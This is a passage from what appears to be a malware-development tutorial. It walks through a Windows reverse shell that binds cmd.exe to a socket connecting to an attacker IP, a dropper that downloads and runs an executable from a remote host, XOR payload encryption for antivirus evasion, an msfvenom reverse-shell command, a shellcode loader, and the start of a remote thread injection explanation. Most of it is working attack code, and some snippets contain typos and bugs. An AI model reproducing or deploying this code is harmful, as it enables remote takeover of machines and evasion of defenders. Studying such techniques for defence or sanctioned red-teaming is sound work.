<p><code>winsock2.h</code>: The primary header file for the Windows Sockets 2 API, often referred to as <strong>Winsock</strong>. It provides functionality similar to the <code>POSIX</code> sockets (<code>&lt;syn/socket.h&gt;</code>), with some critical differences:</p>
<ul>
<li><strong>Header Files</strong>: All necessary functions and data structures are typically contained within <code>winsock2.h</code> and <code>ws2_32.lib</code>, as opposed to the POSIX model, which has them distributed (<code>sys/socket.h</code>, <code>arpa/inet.h</code>, <code>netinet/in.h</code>).</li>
<li><strong>API Initialization</strong>: Before you can make any winsock calls, you must initialize the library by calling the <code>WSAStartup()</code> function. This function takes a version number and a pointer to a <code>WSADATA</code> structure as parameters. When your program is finished using the API, you must call <code>WSACleanup()</code> to de-initialize the library.</li>
<li><strong>Socket Handles</strong>: <code>WinSock</code> functions return a specific data type called <code>SOCKET</code> instead of a file descriptor.</li>
<li><strong>Error Handling</strong>: INstead of checking the <code>errno</code> global variable, <code>Winsock</code> functions return a specific error code, and you retrieve detailed error information by calling <code>WSAGetLastError()</code>.</li>
</ul>
</li>
<li>
<p><code># pragma comment (lib, "ws2_32")</code>: A Microsoft-specific compiler directive used in <code>C/C++</code> programming to tell the linker where to find the code for functions in the <code>winsock2.h</code> header file.</p>
</li>
<li>
<p><code>WSADATA</code>: A data structure that holds details about the Windows Sockets implementation on a given system. Its primary role is to be populated by the <code>WSAStartup</code> function. It is defined in <code>&lt;winsock2.h&gt;</code>.</p>
<ul>
<li><code>WSAStartup</code> fills the WSAData structure with important information about the Winsock DLL, confirming that the requested version of the API is available.</li>
</ul>
<pre><code class="language-C">typedef struct WSAData {
    WORD wVersion;
    WORD wHighVersion;
    char szDescription[WSADESCRIPTION_LEN+1];
    char szSystemStatus[WSASYS_STATUS_LEN+1];
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char FAR *lpVendorInfo;
} WSADATA, *LPWSADATA;
</code></pre>
<p>Here are the <code>WSADATA</code> structure's attributes:</p>
<ul>
<li><code>wVersion</code>: Filled by <code>WSAStartup</code> with the version of the Winsock specification that the program requested.</li>
<li><code>wHighVersion</code>: Filled by <code>WSAStartup</code> with the highest version of the Winsock API that the Winsock DLL can support.</li>
<li><code>szDescription</code>: A null-terminated string that provides a human-readable description of the Winsock implementation (i.e., <code>Winsock 2.0</code>).</li>
<li><code>szSystemStatus</code>: A null-terminated string that contains status or configuration information about the Winsock implementation.</li>
</ul>
</li>
<li>
<p><code>STARTUPINFO</code>: A Windows API structure that specifies how a process is to be created. It allows a parent process to control various aspects of a child process's creation, such as its window properties and (importantly for adversary simulation) the handles used for standard input, output, and error. <code>STARTUPINFO</code> is the WIndows API's equivalent to the UNIX <code>dup2()</code> system call for I/O redirection. It is defined in <code>&lt;windows.h&gt;</code>.</p>
<pre><code class="language-C">typedef struct _STARTUPINFOA {
    DWORD cb;
    [...trunc...]
    DWORD dwFlags;
    [...trunc...]
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
    [...trunc...]
} STARTUPINFOA;
</code></pre>
<p>Here are the <code>STARTUPINFOA</code> data structure's attributes:</p>
<ul>
<li><code>cb</code>: The size of the structure in bytes. Must be set to <code>sizeof(STARTUPINFOA)</code> before the structure is used.</li>
<li><code>dwFlags</code>: A bitmask that contains which of the other fields are used. To redirect standard I/O, you must set this field to <code>STARTF_USESTDHANDLES</code>. Without this flag, the <code>hStd**</code> handles will be ignored.</li>
<li><code>nStdInput</code>: The handle that the new process will use for its standard input (<code>stdin</code>).</li>
<li><code>nStdOutput</code>: The handle for standard output (<code>stdout</code>).</li>
<li><code>nStdError</code>: The handle for standard error (<code>stderr</code>).</li>
</ul>
</li>
<li>
<p><code>PROCESS_INFORMATION</code>: A Windows API structure that provides information about a newly created process and its primary thread. It is a companion structure to <code>STARTUPINFO</code>, used as an output parameter for the <code>CreateProcess</code> function and allows the operating system to return the details of a newly created process. It is defined in <code>&lt;winsock2.h&gt;</code>.</p>
<pre><code class="language-C">typedef struct _PROCESS_INFORMATION{
    HANDLE hProcess;
    HANDLE hThread;
    HANDLE dwProcessId;
    HANDLE dwThreadId;
} PROCESS_INFORMATION;
</code></pre>
<p>Here are the <code>_PROCESS_INFORMATION</code> structure's attributes:</p>
<ul>
<li><code>hProcess</code>: A handle to the newly created process.</li>
<li><code>hThread</code>: A handle to the primary thread of the new process.</li>
<li><code>dwProcessId</code>: The <strong>Process ID</strong> (PID) of the new process.</li>
<li><code>dwThreadId</code>: The <strong>Thread ID</strong> (TID) of the primary thread.</li>
</ul>
</li>
</ul>
<ol start="2">
<li>After including the required libraries and declaring the initial data structures, the program sets the IP address and port it wants to connect with:</li>
</ol>
<pre><code class="language-C">char *attackerIP = "10.10.10.5";
char attackerPort = 4444;
</code></pre>
<ol start="3">
<li>Next, the <code>Windows Sockets</code> library is initialized:</li>
</ol>
<pre><code class="language-C">// Initialize the socket library
WSAStartup(MAKEWORD(2,2), &amp;socketData);

// Create the Socket Object
mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int) NULL);
</code></pre>
<p>Where:</p>
<ul>
<li><code>WSAStartup</code>: A mandatory initialization function for the Windows Sockets API (<code>winsock</code>), needed in order to perform the necessary setup to allow an application use any Winsock functions. It is included in <code>&lt;winsock2.h&gt;</code>.
<pre><code class="language-C">int WSAAPI WSAStartup(WORD wVersionRequired, LPWSADATA lpSAData);
</code></pre>
Here are the <code>WSAStartup</code> function's parameters:
<ul>
<li><code>WORD wVersionRequired</code>: Specifies the version of the Winsock API that the application requires. It is a 16-bit value that is typically created using the <code>MAKEWORD()</code> macro. For instance, <code>MAKEWORD(2,2)</code> for Winsock version <code>2.2</code>.</li>
<li><code>LPWSADATA lpWSAData</code>: a pointer to the <code>WSAData</code> structure, which will be populated with information about eh Winsock implementation on the system.</li>
<li><code>WSAStartup</code> returns <code>0</code> on success and a non-zero error code on failure.</li>
</ul>
</li>
<li><code>WSASocket</code>: A Windows socket (<code>Winsock</code>) function used to create a new socket. It is preferred to <code>socket()</code>, which is older and has fewer features. It is included in <code>&lt;winsock2.h&gt;</code>.
<pre><code class="language-C">SOCKET WSAAPI WSASOCKET(
    int af,
    int type,
    int protocol,
    LPWSAPROTOCOL_INFO lpProtocolInfo,
    GROUP g,
    DWORD dwFlags
);
</code></pre>
Here are the <code>WSASOCKET</code> function's parameters:
<ul>
<li><code>int af</code>: Address Family</li>
<li><code>int type</code>: The Socket Type (i.e., <code>SOCK_STREAM</code>, <code>SOCK_DGRAM</code>, etc.)</li>
<li><code>int protocol</code>: The protocol used, such as <code>IPPROTO_TCP</code> or <code>IPPROTO_UDP</code></li>
<li><code>LPWSAPROTOCOL_INFO lpProtocolInfo</code>: A pointer to a <code>WSAPROTOCOL_INFO</code> structure, which is used for advanced socket features, such as socket cloning. For a basic socket, this is typically set to <code>NULL</code>.</li>
<li><code>GROUP g</code>: A group identifier for socket sharing. Use <code>0</code> for a simple socket.</li>
<li><code>DWORD dwFlags</code>: A set of flags that define additional socket attributes. A common flag is <code>WSA_FLAG_OVERLAPPED</code>, which enables asynchronous (non-blocking) I/O. For a simple, blocking socket, this is typically <code>0</code>.</li>
<li><code>WSASOCKET</code> returns a <code>SOCKET</code> handle if success. Returns <code>INVALID_SOCKET</code> on failure.</li>
</ul>
</li>
</ul>
<ol start="4">
<li>Next, the socket address structure is filled with the IP Address and Port Number and a connection is attempted using <code>WSAConnect()</code>:</li>
</ol>
<pre><code class="language-C">// Fill in the sockaddr_in structure
connectionAddress.sin_family = AF_INET;
connectionAddress.sin_port = htons(attackerPort);
connectionAddress.sin_addr.s_addr = inet_aton(attackerIP);
//Establish a connection to the remote host
WSAConnect(mainSocket, (SOCKADDR*)&amp;connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);
</code></pre>
<p>Where:</p>
<ul>
<li><code>WSAConnect()</code>: Used by a client program to establish a connection to a remote server. It is defined in <code>&lt;winsock2.h&gt;</code>.
<pre><code class="language-C">int WSAAPI WSAConnect(
    SOCKET s,
    const SOCKADDR* name,
    int namelen,
    LPWSABUF lpCallerData,
    LPWSABUF lpCalleeData,
    LPQOS lpSQOS,
    LPQOS lpGQOS
);
</code></pre>
Here are the <code>WSAConnect</code> function's parameters:
<ul>
<li><code>SOCKET s</code>: The Socket handle returned from a call to <code>WSASOCKET()</code>.</li>
<li><code>const SOCKADDR* name</code>: A pointer to a <code>sockaddr</code> structure, which contains the IP address and Port of the server you want to connect to.</li>
<li><code>int namelen</code>: The size of the <code>sockaddr</code> structure in bytes.</li>
<li>The remaining parameters are used for advanced features, like sending data with the connection request or specifying the <strong>Quality of Service</strong>. For a basic connection, they are usually <code>NULL</code>.</li>
<li><code>WSAConnect</code> returns <code>0</code> on success. On failure, it returns <code>SOCKET_ERROR</code>.</li>
</ul>
</li>
</ul>
<ol start="5">
<li>Finally, the <code>STARTUPINFO</code> structure is filled out and a child process is created to run the shell.</li>
</ol>
<pre><code class="language-C">// Zero out the space allocated for the `startupInfo` structure
memset(&amp;startupInfo, 0, sizeof(startupInfo));
// Fill in `startupInfo`
startupInfo.cb = sizeof(startupInfo);
startupInfo.dwFlags = STARTF_USESTDHANDLES;
startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;
// Initiate cmd.exe with redirected streams
CreateProcess(NULL, "cmd.exe", NULL, NUL, TRUE, 0, NULL, NULL, &amp;startupInfo, &amp;processInfo);
</code></pre>
<p>Where:</p>
<ul>
<li><code>memset</code>: A C standard library function used to fill a block of memory with a specific repeating byte value. It is an essential utility for initializing data structures, especially for network and system programming, where you need to ensure all fields are zeroed out before use. It is included in <code>&lt;string.h&gt;</code>.
<pre><code class="language-C">void *memset(void *s, int c, size_t n);
</code></pre>
Here are the <code>memset</code> function's parameters:
<ul>
<li><code>void *s</code>: A pointer to the starting address of the memory block that you want to fill.</li>
<li><code>int c</code>: The value that will be written to each byte of the memory block. A common use is to pass <code>0</code> to zero out the memory.</li>
<li><code>size_t n</code>: The number of bytes in the memory block that you want to fill.</li>
<li><code>memset</code> returns a pointer to the memory block, which is the first parameter.</li>
</ul>
</li>
<li><code>CreateProcess()</code>: The core Windows API function used to create a new process and its primary thread. It is critical for any program that needs to launch another executable, such as a malware payload launching a command-line shell to serve as a reverse shell.
<pre><code class="language-C">BOOL CreateProcessA(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);
</code></pre>
Here are the <code>CreateProcessA</code> function's parameters:
<ul>
<li><code>lpCommandLine</code>: A pointer to a string that specifies the command to be executed. You can also use <code>lpApplicationName</code> for this purpose.</li>
<li><code>bInheritHandles</code>: A crucial parameter for I/O redirection. It must be set to true to allow the child process to inherit the parent's inheritable handles.</li>
<li><code>dwCreationFlags</code>: Flags to control the process creation. Set it to <code>CREATE_NO_WINDOW</code> to prevent the new process from creating a Window object.</li>
<li><code>lpStartupInfo</code>: A pointer to the <code>STARTUPINFO</code> structure.</li>
<li><code>lpProcessInformation</code>: A pointer to the <code>PROCESS_INFORMATION</code> structure</li>
<li><code>CreateProcess</code> returns a non-zero value on success, <code>0</code> on failure.</li>
</ul>
</li>
</ul>
<h2 id="leveraging-windows-internals-for-malware-development"><a class="header" href="#leveraging-windows-internals-for-malware-development">Leveraging Windows Internals for Malware Development</a></h2>
<p>The Windows API allows developers to interact with the Windows Operating System via their applications. For example, if an app needs to render content on a scree, access a local file, or download something from the internet, these tasks can be accomplished through the Windows API.</p>
<p><strong>For Example</strong></p>
<pre><code class="language-C">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
int main() {
    char username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    GetUserName(username, &amp;username_len);
    printf("current user is: %s\n", username);
    return 0;
}
</code></pre>
<p>This program utilizes the <code>GetUserName</code> API.</p>
<ul>
<li>
<p><code>GetUserName</code>: A Windows API function used to retrieve the name of the user associated with the current thread. It is included in <code>&lt;windows.h&gt;</code> and requires the <code>advapi32.lib</code> library for linking.</p>
<pre><code class="language-C">BOOL GetUserNameA(
    LPSTR lpBuffer,
    LPDWORD lpnSize
);
</code></pre>
<p>Here are the <code>GetUserNameA</code> function's parameters:</p>
<ul>
<li><code>LPSTR lpBuffer</code>: A pointer to a buffer where the function will copy the user's name as a null-terminated string. A constant like <code>UNLEN+1</code> (from <code>lmcons.h</code>) is used so that an appropriate buffer size is allocated for the username before the call to <code>GetUserNameA</code>.</li>
<li><code>LPDWORD lpnSize</code>: A pointer to a variable that receives the number of characters copied into the <code>lpBuffer</code>, including the <code>NULL</code> terminator. It is also used to tell <code>GetUserNameA</code> the maximum number of characters <code>lpBuffer</code> can hold.</li>
<li><code>GetUserNameA</code> returns a non-zero value on success. On failure, it returns <code>0</code>.</li>
</ul>
<p>Many Windows API functions have both an <code>A</code> and a <code>W</code> variant. The <code>A</code> variants include functions that use a single-byte character set, typically based on the system's active code page (i.e., <code>ASCII</code>). A string is <code>NULL</code> terminated with a single byte (<code>0x00</code>). The <code>W</code> variants include functions that use a 16-bit wide character set, which on Windows is <code>UTF-16</code>. A string is <code>NULL</code> terminated with a two-byte sequence (<code>0x00 0x00</code>). This is the native, preferred encoding for modern Windows:</p>
<pre><code class="language-C">BOOL GetUserNameW(
    LPWSTR lpBuffer,
    LPDWORD lpnSize
);
</code></pre>
<p>The number of bytes required will differ, depending on which version is used:</p>
<pre><code class="language-C">char s1[] = "malware";     // 8 bytes (malware + null byte)
char s2[] = L"malware";    // 16 bytes each char + null are 2 bytes.
</code></pre>
</li>
</ul>
<div id="admonition-note-1" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-1-title">
<div class="admonition-title">
<div id="admonition-note-1-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Essentials.html#admonition-note-1"></a>
</div>
<div>
<p><code>UNLEN</code> is a constand, defined in <code>lmcons.h</code>, which is included in <code>&lt;windows.h&gt;</code>.</p>
</div>
</div>
<p>Malware development requires a deep understanding of the tools and techniques that make it possible to interact with, manipulate, and investigate processes and memory within the Windows Operating System. This is why it is crucial to know the <strong>Windows Debugging APIs</strong>, the set of functions provided by Windows that can be utilized to manipulate memory and processes (i.e., <code>VirtualAlloc</code>, <code>VirtualProtect</code>, <code>RtlMoveMemory</code>, <code>CreateThread</code>, etc.). PE files can compile to either executables (<code>.exe</code>) or Dynamically Linked Libraries (<code>.DLL</code>). The main difference is that an <code>.exe</code> requires a function called <code>main</code>, which the OS loader calls when a new process is ready, and <code>.dll</code> needs a function called <code>DllMain</code>, since the loader has already set up the process in memory.</p>
<p><strong>For Example</strong></p>
<pre><code class="language-C">#include &lt;windows.h&gt;
#pragma comment (lib, "user32.lib")
BOOL APIENTRY DllMain(HMODULE mHandle, DWORD actionReason, LPVOID reservedPointer){
    switch(actionReason){
        case DLL_PROCESS_ATTACH:
            MessageBox(NULL, "You Have Been Hacked!", "&gt;;-)", MB_OK);
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
</code></pre>
<p>Where:</p>
<ul>
<li><code>DllMain</code>: The primary entry-point function for a <code>DLL</code>. This function is called by the OS Loader to notify a <code>DLL</code> of important events, such as when it is loaded into a process, when a thread is created or destroyed within that process, or when the <code>DLL</code> is unloaded.
<pre><code class="language-C">BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpvReserved
);
</code></pre>
Here is a breakdown of the <code>DllMain</code> function's parameters:
<ul>
<li><code>HINSTANCE hinstDLL</code>: A handle to the <code>DLL</code> itself.</li>
<li><code>DWORD fdwReason</code>: Defines the reason why the OS is calling <code>DllMain</code>. For instance:
<ul>
<li><code>DLL_PROCESS_ATTACH</code>: The <code>DLL</code> is being loaded into the virtual address space of the current process.</li>
<li><code>DLL_THREAD_ATTACH</code>: A new thread is being created in the current process, and the <code>DLL</code> has already been attached to the process.</li>
<li><code>DLL_THREAD_DETACH</code>: A thread is exiting cleanly from the current process's virtual space.</li>
<li><code>DLL_PROCESS_DETACH</code>: The <code>DLL</code> is being unloaded from the current process's virtual address space.</li>
</ul>
</li>
<li><code>LPVOID lpvReserved</code>: A reserved parameter that can provide additional information for certain events.</li>
<li><code>DllMain</code> return <code>TRUE</code> on successful initialization, <code>FALSE</code> otherwise.</li>
</ul>
</li>
</ul>
<h3 id="deceiving-a-victims-systems"><a class="header" href="#deceiving-a-victims-systems">Deceiving a Victim's Systems</a></h3>
<p>A malicious program can use many technique to deceive a target system, including:</p>
<ul>
<li><strong>Downloading and executing malware from a remote server</strong>:</li>
</ul>
<pre><code class="language-C">#include &lt;windows.h&gt;
#include &lt;urlmon.h&gt;
#pragma comment(lib, "urlmon.lib")
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdline, int nCmdShow){
    URLDownloadToFile(
        NULL,
        "http://maliciouswebsite.com/malware.exe",
        "C:\\temp\\malware.exe",
        0,
        NULL
    );
    ShellExecute(
        NULL,
        "open",
        "C:\\temp\\malware.exe",
        NULL,
        NULL,
        SQ_SHOWNORMAL
    );
    return 0;
}
</code></pre>
<p>A malware may be hosted on a remote server and a dropper program can be used to download and execute it.</p>
<ul>
<li><strong>Antivirus (AV)/Endpoint Detection Response (EDR) evasion tricks</strong></li>
</ul>
<pre><code class="language-C">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

// Function to perform simple XOR encryption/decryption
void xor_encrypt_decrypt(char* input, char key){
    char* iterator = input;
    while(*iterator){
        iterator ^= key;
        iterator++;
    }
}

int main(){
    char payload[] = "&lt;MALICIOUS_PAYLOAD&gt;";
    printf("original payload %s\n", payload);
    xor_encrypt_decrypt(payload, 'k');
    printf("encrypted payload: %s\n", payload);

    // At this point, the payload may bnot be recognized by AV
    // When we're ready to exexcute it, we decrypt it
    xor_encrypt_decrypt(payload, 'k');
    printf("decrypted payload: %s\n", payload);

    // Now, we can execute our payload...
    hack();
    return;
}
</code></pre>
<p>An effective way to evade AV is to employ encryption. This may involve encryption a payload and decrypting it only when its about to be executed. More on this in <code>Malware Detection Evasion Techniques</code>.</p>
<h2 id="malware-injection-attacks"><a class="header" href="#malware-injection-attacks">Malware Injection Attacks</a></h2>
<p><strong>Code Injection</strong> is a simple technique where one process adds code to another process that is already working. It is a good technique to use to promote good <strong>OpSec</strong>.</p>
<p><strong>For Example</strong></p>
<pre><code class="language-asm64">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=4444 -f c
</code></pre>
<pre><code class="language-asm64">; output
[-] No platform was selected...
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of C file: 1963 bytes
unsigned char buffer[] =
"\xfc\x48\x83\xe4..."
[...trunc...]
"...\xda\xff\xd5";
</code></pre>
<p>Here is a breakdown of this command:</p>
<ul>
<li><code>msfvenom</code>: A powerful payload generator that comes as a part of the Metasploit Framework.</li>
<li><code>-p windows/x64/shell_reverse_tcp</code>: Specifies the payload to use
<ul>
<li><code>-p</code>: Flat to indicate that a payload will be selected</li>
<li><code>windows/x64/shell_reverse_tcp</code>: A payload for a tcp reverse shell on a Windows x86-64 system.</li>
</ul>
</li>
<li><code>LHOST=[HOST IP]</code>: Sets the IP address of the Listening Host</li>
<li><code>LPORT=[HOST IP]</code>: Sets the Port Number of the Listening Host</li>
<li><code>-f c</code>: Specifies that the payload should be output as a C-style byte array.</li>
</ul>
<p>The resulting output is the shellcode being used as our payload.</p>
<div id="admonition-note-2" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-2-title">
<div class="admonition-title">
<div id="admonition-note-2-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Essentials.html#admonition-note-2"></a>
</div>
<div>
<p>What is <strong>Shellcode</strong>?
<strong>Shellcode</strong> is basically CPU instructions which are executed by the processor directly in memory. Malicious actors copy shellcode into the memory space of a process and use a variety of techniques to highjack the <strong>Instruction Pointer</strong> register (<code>RIP</code>), resulting in that shellcode being executed. For our purposes here, the shellcode makes up the instructions which tell the CPU to create a reverse shell for an x64 system that connects out to an attacking system. More specific details can be found in <code>Appendix B: Manually Writing Shellcode for Windows</code>.</p>
</div>
</div>
<p>Here is the program used to run the payload, called a <strong>shellcode loader</strong>:</p>
<pre><code class="language-C">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

// reverse shell payload from msfvenom
unsigned char payload[] =
"\xfc\x48\x83\xe4..."
[...trunc...]
"...\xda\xff\xd5";

unsigned int payload_len = sizeof(payload);

int main(void){
    void* payload_mem;
    BOOL result;
    HANDLE thread_handle;
    DWORD oldprotect = 0;

    payload_mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(payload_mem, payload, payload_len);
    result = VirtualProtect(payload_mem, payload_len, PAGE_EXECUTE_READ, &amp;oldprotect);
    if (result != 0){
        thead_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload_mem, 0, 0, 0);
        WaitForSingleObject(thread_handle, -1);
    }
    return 0;
}
</code></pre>
<p>Where:</p>
<ul>
<li>
<p><code>stdlib.h</code>: A standard C library header file that provides a collection of general-purpose utility functions, such as:</p>
<ul>
<li><code>malloc</code>: Allocates a block of memory of a specified size</li>
<li><code>calloc</code>: Allocates memory for an array of elements and initializes all bytes to zero.</li>
<li><code>free</code>: Deallocates a memory block, releasing it back to the system.</li>
<li><code>system</code>: Executes a command passed as a string to the systems command interpreter.</li>
<li><code>atoi</code>: Converts a string to an integer.</li>
<li><code>atol</code>: Converts a string to a long integer.</li>
</ul>
</li>
<li>
<p><code>windows.h</code>: The master header file for the Windows API, providing a convenient way to access the full power of the Windows API without manually having to figure out and include every individual header function you need (i.e., <code>winsock2.h</code>, <code>winnt.h</code>, <code>winbase.h</code>, etc.).</p>
<ul>
<li><code>windows.h</code> is where the <code>UNICODE</code> and <code>_UNICODE</code> preprocessor macros are typically defined. If you define <code>UNICODE</code> before including <code>windows.h</code>, all generic API names automatically resolve to the <code>W</code> variants:</li>
</ul>
<pre><code class="language-C">#define UNICODE
#include &lt;windows.h&gt;
[...trunc...]
CreateFile(...);        // Expands to CreateFileW(...)
</code></pre>
<ul>
<li>
<p>Otherwise, they expand to the <code>A</code> versions.</p>
<ul>
<li><code>_UNICODE</code> is used for the <code>C Runtime Library</code> (CRT), not the Windows API, but the purpose is the same.</li>
</ul>
</li>
<li>
<p>The header file for <code>GetUserName</code> contains the following logic:</p>
</li>
</ul>
<pre><code class="language-C">#ifdef UNICODE
#define GetUserName GetUserNameW
#else
#define GetUserName GetUserNameA
#endif
</code></pre>
</li>
<li>
<p><code>string.h</code>: A standard C library header file that provides a set of functions for manipulating <code>NULL</code> terminated strings and blocks of memory, including:</p>
<ul>
<li><code>strlen</code>: Returns the length of a string, not including the <code>NULL</code> terminator</li>
<li><code>strcpy</code>: Copies a source string to a destination buffer.
<ul>
<li><code>strcpy</code> is a common source of buffer overflow vulnerabilities</li>
</ul>
</li>
<li><code>strncpy</code>: Copies at most <code>n</code> bytes from a source to a destination buffer.</li>
<li><code>memcpy</code>: Copies a block of memory from a source to a destination.</li>
<li><code>memset</code>: Fills a block of memory with a specific byte.</li>
</ul>
</li>
</ul>
<p>Running this program directly on the target system is not very conspicuous, as an unrecognized process initiating an outward network connection immediately raises the suspicion of any capable cyber defense team. Instead, we can use <strong>remote code injection</strong> to execute the payload in another process on the target machine to avoid suspicion.</p>
<h3 id="remote-thread-injection"><a class="header" href="#remote-thread-injection">Remote Thread Injection</a></h3>
<p>In a sense, the previous example is an instance of <strong>code injection</strong>. A new process is started, memory space is allocated, the shellcode is copied into the reserved buffer and a new thread is initialized to execute the shellcode.</p>
<p><strong>Remote Code Injection</strong> is very similar, with the added caveat that the payload is executed within the address space of another process. One example of a remote code injection technique is <strong>Remote Thread Injection</strong>. Remote thread injection is a method where a new thread gets created within a target process to execute the payload. It can be broken down into three, simple steps:</p>
<ol>
<li>Memory is allocated within a target process, initializing a buffer at least as large as the payload.</li>
<li>The payload is copied into the allocated buffer.</li>
<li>A request is made to execute the payload within the target process.</li>
</ol>
<p>The most common way of accomplishing this is to use builtin Windows API functions:</p>
<ul>
<li>
<p><code>OpenProcess</code>: A Windows API function that provides a handle to an existing process.</p>
<pre><code class="language-C">HANDLE OpenProcess(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>OpenProcess</code> function's parameters:
<ul>
<li><code>dwDesiredAccess</code>: A set of flags that specify the access rights requested for the process handle. Examples include:
<ul>
<li><code>PROCESS_VM_OPERATION</code>: Allocate and change memory</li>
<li><code>PROCESS_VM_WRITE</code>: Write data to memory</li>
<li><code>PROCESS_CREATE_THREAD</code>: Create a new thread</li>
<li><code>PROCESS_ALL_ACCESS</code>: Obtain all possible rights</li>
</ul>
</li>
<li><code>bInheritHandle</code>: A boolean value that, if <code>TRUE</code>, allows the handle to be inherited by any child processes created by the current process.</li>
<li><code>dwProcessId</code>: The <strong>Process Identifier</strong> (PID) of the process you want to open.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>VirtualAllocEx</code>: A Windows API function that reserves, commits, or changes the state of a region of pages in the virtual address space of a specified external process. It is critical for tools that perform code injection, because it allows them to allocate space in a target process's memory space.</p>
<pre><code class="language-C">LPVOID VirtualAllocEx(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>VirtualAllocEx</code> function's parameters:
<ul>
<li><code>hProcess</code>: A handle to the process, where the memory will be allocated. The handle must have the <code>PROCESS_VM_OPERATION</code> access right.</li>
<li><code>lpAddress</code>: The desired starting address for the region of pages to allocate. Typically set to <code>NULL</code>, allowing the OS to determine where to place the memory block.</li>
<li><code>dwSize</code>: The size, in bytes, of the memory region to be allocated.</li>
<li><code>flAllocationType</code>: A flag that specifies the type of memory allocation (i.e., <code>MEM_COMMIT</code> or <code>MEM_RESERVE</code>).</li>
<li><code>flProtect</code>: A flag that sets the memory protection for the region, determining what actions can be performed on the memory.</li>
<li><code>VirtualAllocEx</code> returns a pointer to the base address of the allocated memory region, if successful. On failure it returns <code>NULL</code>.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>WriteProcessMemory</code>: A Windows API function, used to write data into an allocated region of memory within another process.</p>
<pre><code class="language-C">BOOL WriteProcessMemory(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>WriteProcessMemory</code> function's parameters:
<ul>
<li><code>hProcess</code>: A handle to the target process, which must have <code>PROCESS_VM_WRITE</code> and <code>PROCESS_VM_OPERATION</code> access rights to allow the calling process to modify the target process's memory.</li>
<li><code>lpBaseAddress</code>: The starting base address in the target process's virtual memory, where the data will be written. In this instance, it will be the address returned by <code>VirtualAllocEx</code>.</li>
<li><code>lpBuffer</code>: A pointer to the buffer that contains the data to be written. The address of the malicious shellcode within the injector's own memory.</li>
<li><code>nSize</code>: The number of bytes to be written from the source buffer into the target process's memory.</li>
<li><code>lpNumberOfBytesWritten</code>: An optional pointer to a variable that receives the number of bytes that were actually written into the target process. This can be <code>NULL</code>.</li>
<li><code>WriteProcessMemory</code> returns <code>TRUE</code> if successful, <code>FALSE</code> upon failure.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>CreateRemoteThread</code>: A powerful Windows API function used to create a new thread of execution within the virtual address space of a specified external process. It is critical for remote thread injection, as it is the function responsible for executing the malicious code.</p>
<pre><code class="language-C">HANDLE CreateRemoteThread(
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LP_THREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreatinFlags,
    LPDWORD lpThreadId
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>CreateRemoteThread</code> function's parameters:
<ul>
<li><code>hProcess</code>: A handle to the target process where the new thread will be created. This handle must have the <code>PROCESS_VM_OPERATION</code> and <code>PROECSS_CREATE_THREAD</code> access rights enabled.</li>
<li><code>lpThreadAttribtutes</code>: An optional pointer to a <code>SECURITY_ATTRIBUTES</code> structure that specifies the security descriptor for the new thread. SEt to <code>NULL</code> for default security.</li>
<li><code>dwStackSize</code>: The initial stack size for the new thread to commit in memory. If the value is <code>0</code>, the new thread's stack size will be the same as the creating process's primary thread.</li>
<li><code>lpStartAddress</code>: The most crucial parameter. A pointer to the starting address of the function that the new thread will execute. In remote thread injection, this will be the address of the malicious shellcode that was written into the target process's memory.</li>
<li><code>lpParameter</code>: An optional pointer to a single value that is passed as an argument to the thread's start function.</li>
<li><code>dwCreationFlags</code>: A flag that controls the creation of the thread.
<ul>
<li><code>0</code>: Thread is created and immediately executed</li>
<li><code>CREATE_SUSPENDED</code> (0x00000004): Thread is created, but immediately pauses execution until the <code>ResumeThread</code> function is called.</li>
<li><code>STACK_SIZE_PARAM_IS_A_RESERVATION</code> (0x00010000): Changes the meaning behind the <code>dwStackSize</code> parameter, so that it specifies the total reserved size of the stack, rather than the committed size.</li>
</ul>
</li>
